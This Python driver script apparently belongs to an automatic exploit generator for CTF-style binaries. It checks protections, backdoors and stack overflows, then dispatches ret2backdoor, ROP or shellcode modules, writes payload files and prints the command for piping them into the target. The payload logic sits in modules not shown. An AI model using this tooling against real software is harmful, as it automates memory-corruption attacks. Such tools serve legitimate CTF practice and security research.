#!/usr/bin/env python3
import argparse
import logging
import os
import sys
from pwncli import *

from analysis import inputDetector
from analysis import protectionDetector
from analysis import backdoorDetector
from analysis import overflowDetector_static
from analysis import overflowDetector_dynamic
from exploits import ret2backdoor
from exploits import stackRop
from exploits import stackShellcode

logging.basicConfig()
logging.root.setLevel(logging.INFO)
log = logging.getLogger(__name__)

binary_file_path = ""
input_funcs = []


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("file", help="File to analyze")
    args = parser.parse_args()
    if args.file is None:
        log.info("[-] Exitting no file specified")
        exit(1)
    binary_file_path = os.path.abspath(args.file)
    log.info("[+] Check input functions")
    input_funcs = inputDetector.getInputFuncs(binary_file_path)
    log.info("[+] Check properties")
    properties = protectionDetector.getProperties(binary_file_path)
    log.info("[+] Check backdoor")
    backdoors = backdoorDetector.getBackdoors(binary_file_path)
    log.info("[+] Check overflow")
    overflow_list = overflowDetector_static.analysis(binary_file_path,
                                                     input_funcs, properties)
    if len(overflow_list) > 0:
        log.info("[+] Overflow exist")
        if not properties['canary']:
            log.info("[+] No Canary")
            if len(backdoors) > 0:
                log.info("[+] Backdoors exist")
                if not properties['pie']:
                    log.info("[+] No PIE")
                    payload = ret2backdoor.exploit(binary_file_path, overflow_list,
                                                backdoors)
                    binary_name = os.path.basename(binary_file_path)
                    for p in range(len(payload)):
                        filename = '%s-exploit-%s' % (binary_name, p + 1)
                        with open(filename, 'wb') as f:
                            f.write(payload[p])
                    print("%s exploit in %s" % (binary_name, filename))
                    print("run with `(cat %s; cat -) | %s`" % (filename, binary_file_path))
            elif properties['relro'] != 'Full':
                log.info("[+] Try ROP")
                if not properties['pie']:
                    log.info("[+] No PIE")
                    stackRop.exp(binary_file_path, overflow_list)
    elif properties['RWX']:
        log.info("[+] Has RWX segments")
        stackShellcode.exp(binary_file_path, properties)
    # exploitable_state = overflowDetector_dynamic.analysis(binary_file_path)
    # ret2backdoor.exploit_dynamic(exploitable_state,backdoors)


def stackShellcodeTest():
    parser = argparse.ArgumentParser()
    parser.add_argument("file", help="File to analyze")
    args = parser.parse_args()
    binary_file_path = os.path.abspath(args.file)
    properties = protectionDetector.getProperties(binary_file_path)
    stackShellcode.exp(binary_file_path, properties)


def ret2backdoorTest():
    parser = argparse.ArgumentParser()
    parser.add_argument("file", help="File to analyze")
    args = parser.parse_args()
    binary_file_path = os.path.abspath(args.file)
    input_funcs = inputDetector.getInputFuncs(binary_file_path)
    properties = protectionDetector.getProperties(binary_file_path)
    backdoors = backdoorDetector.getBackdoors(binary_file_path)
    overflow_list = overflowDetector_static.analysis(binary_file_path,
                                                     input_funcs)
    payload = ret2backdoor.exploit(binary_file_path, overflow_list, backdoors)
    binary_name = os.path.basename(binary_file_path)
    for p in range(len(payload)):
        filename = '%s-exploit-%s' % (binary_name, p + 1)
        with open(filename, 'wb') as f:
            f.write(payload[p])
    print("%s exploit in %s" % (binary_name, filename))
    print("run with `(cat %s; cat -) | %s`" % (filename, binary_file_path))


if __name__ == "__main__":
    main()
